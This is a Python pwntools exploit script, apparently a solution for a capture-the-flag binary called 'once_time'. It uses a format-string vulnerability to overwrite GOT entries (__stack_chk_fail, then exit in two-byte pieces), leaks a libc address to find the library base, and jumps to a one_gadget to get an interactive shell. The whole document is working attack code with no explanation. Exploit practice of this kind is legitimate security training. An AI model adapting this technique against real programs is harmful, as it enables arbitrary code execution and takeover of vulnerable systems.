from pwn import *
p=process('./once_time')
elf=ELF('./once_time')
libc=ELF('./libc.so.6')
#gdb.attach(p,'''
#	break *0x0000000000400a03
#	break *0x00000000004009df
#	break *0x0000000000400917
#	break *0x400968
#	continue
#''')
gdb.attach(p,'''
	break *0x0000000000400957
	continue
''')
start_address=0x0000000000400983
stack_check_fail=elf.got['__stack_chk_fail']
p.recvuntil('input your name: ')
payload1=p64(stack_check_fail)
p.sendline(payload1)
p.recvuntil('leave a msg: ')
payload2='%4196739x%12$n%3$lx%9$lx'
p.sendline(payload2)
p.recvuntil('400ab5')
string=p.recvline()
#print string
read_address=int(string[0:12],16)-17
print hex(read_address)
libc_base=read_address-libc.symbols['read']
log.info("libc_base > "+hex(libc_base))
address=libc_base+0x4f2c5
#address=libc_base+0x4f322
#address=libc_base+0x10a38c
#address=libc_base+libc.symbols['system']
log.info("one_gadget > "+hex(address))
p.recvuntil('input your name: ')
payload4=p64(elf.got['exit'])
p.sendline(payload4)
p.recvuntil('leave a msg: ')
payload3='%'+str(address&0xffff)+'d%12$hn'
payload3=payload3.ljust(0x20,'\x00')
p.send(payload3)
p.recvuntil('input your name: ') 
payload5=p64(elf.got['exit']+2)
p.sendline(payload5)
p.recvuntil('leave a msg: ')
payload6="%" + str((address>>16)&0xffff) + "d%12$hn" 
payload6=payload6.ljust(0x20,'\x00')
p.send(payload6)
p.recvuntil('input your name: ')
payload4=p64(elf.got['exit']+4)
p.sendline(payload4)
p.recvuntil('leave a msg: ')
payload3='%'+str((address>>32)&0xffff)+'d%12$hn'
payload3=payload3.ljust(0x20,'\x00')
p.send(payload3)
'''
p.recvuntil('input your name: ') 
payload5=p64(elf.got['exit']+6)
p.send(payload5)
p.recvuntil('leave a msg: ')
payload6="%" + str((address>>48)&0xffff) + "d%12$hn"
payload6=payload6.ljust(0x20,'\x00')
p.send(payload6)
'''
p.recvuntil('input your name: ')
payload4='a'
p.sendline(payload4)
p.recvuntil('leave a msg: ')
payload3='%p'
p.sendline(payload3)

p.interactive()
